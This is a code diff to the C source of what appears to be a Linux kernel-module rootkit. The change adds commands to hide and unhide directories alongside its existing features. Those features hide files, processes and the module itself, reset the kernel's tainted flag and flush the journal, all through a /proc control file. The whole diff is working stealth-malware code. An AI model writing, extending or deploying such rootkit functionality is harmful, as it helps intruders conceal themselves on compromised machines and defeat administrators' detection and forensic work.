@@ -64,7 +64,6 @@ struct task_struct *tsk_tainted = NULL;
 
 static struct proc_dir_entry *rrProcFileEntry;
 struct __lkmmod_t{ struct module *this_mod; };
-static unsigned int op_lock;
 static DEFINE_MUTEX(prc_mtx);
 static DEFINE_SPINLOCK(elfbits_spin);
 
@@ -432,9 +431,11 @@ enum {
 
     /** file stealth operations */
     Opt_hide_file,
+    Opt_hide_directory,
     Opt_hide_file_anywhere,
     Opt_list_hidden_files,
     Opt_unhide_file,
+    Opt_unhide_directory,
 
     /** misc */
     Opt_journalclt,
@@ -452,9 +453,11 @@ static const match_table_t tokens = {
     {Opt_unhide_module, "unhide-lkm=%s"},
 
     {Opt_hide_file, "hide-file=%s"},
+    {Opt_hide_directory, "hide-directory=%s"},
     {Opt_hide_file_anywhere, "hide-file-anywhere=%s"},
     {Opt_list_hidden_files,"list-hidden-files"},
     {Opt_unhide_file, "unhide-file=%s"},
+    {Opt_unhide_directory, "unhide-directory=%s"},
 
     {Opt_journalclt, "journal-flush"},
     {Opt_fetch_base_address, "base-address=%d"},
@@ -510,41 +513,43 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                 }
                 break;
             case Opt_hide_file:
+            case Opt_hide_directory:
                 {
                     char *s = args[0].from;
-                    const char *tmp[] = {NULL, NULL};
-                    struct kstat stat;
+                    struct kstat stat = {0};
                     struct path path;
 
                     if (fs_kern_path(s, &path) && fs_file_stat(&path, &stat)) {
                         /** It is filename, no problem because we have path.dentry */
                         const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
-                        path_put(&path);
-                        tmp[0] = f;
-                        fs_add_name_rw(tmp, stat.ino);
-                        kv_mem_free(&f);
-                    } else {
-                        if (*s != '.' && *s != '/') {
-                            tmp[0] = s;
-                            fs_add_name_rw(tmp, stat.ino);
+                        bool is_dir = ((stat.mode & S_IFMT) == S_IFDIR);
+
+                        if (is_dir) {
+                            u64 parent_inode = fs_get_parent_inode(&path);
+                            fs_add_name_rw_dir(f, stat.ino, parent_inode, is_dir);
+                        } else {
+                            fs_add_name_rw(f, stat.ino);
                         }
+                        path_put(&path);
+                        kv_mem_free(&f);
+                    } else if (*s != '.' && *s != '/') {
+                        /** add with unknown inode number */
+                        fs_add_name_rw(s, stat.ino);
                     }
                 }
                 break;
+            case Opt_unhide_file:
+            case Opt_unhide_directory:
+                 fs_del_name(args[0].from);
+                break;
+                /* Currently, directories must
+                 * be added individually: use hide-directory
+                 * */
             case Opt_hide_file_anywhere:
-                {
-                    const char *n[] = {args[0].from,NULL};
-                    fs_add_name_rw(n, 0);
-                }
+                fs_add_name_rw(args[0].from, 0);
                 break;
             case Opt_list_hidden_files:
                 fs_list_names();
-                break;
-            case Opt_unhide_file:
-                {
-                    const char *n[] = {args[0].from, NULL};
-                    fs_del_name(n);
-                }
                 break;
             case Opt_journalclt:
                 {
@@ -745,7 +750,7 @@ static int __init kv_init(void) {
 
     int rv = 0;
     char *procname_err = "";
-    const char *hideprocname[] = {PROCNAME, NULL};
+    const char **name;
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
     struct kernel_syscalls *kaddr = NULL;
 #endif
@@ -789,7 +794,7 @@ static int __init kv_init(void) {
     if (!tsk_prc)
         goto unroll_init;
 
-    fs_add_name_ro(hideprocname, 0);
+    fs_add_name_ro(PROCNAME, 0);
 
     tsk_tainted = kthread_run(_reset_tainted, NULL, THREAD_TAINTED_NAME);
     if (!tsk_tainted)
@@ -815,17 +820,19 @@ cont:
     kv_hide_task_by_pid(tsk_prc->pid, 0, CHILDREN);
     kv_hide_task_by_pid(tsk_tainted->pid, 0, CHILDREN);
 
-    /** hide magic filenames & directories */
-    fs_add_name_ro(hide_names, 0);
-
     /** hide magic filenames, directories and processes */
-    fs_add_name_ro(kv_get_hide_ps_names(), 0);
+    for (name = hide_names; *name != NULL; ++name) {
+        fs_add_name_ro(*name, 0);
+    }
+
+    for (name = kv_get_hide_ps_names(); *name != NULL; ++name) {
+        fs_add_name_ro(*name, 0);
+    }
 
     kv_scan_and_hide();
 
 #ifndef DEBUG_RING_BUFFER
     kv_hide_mod();
-    op_lock = 1;
 #endif
 
     prinfo("loaded.\n");
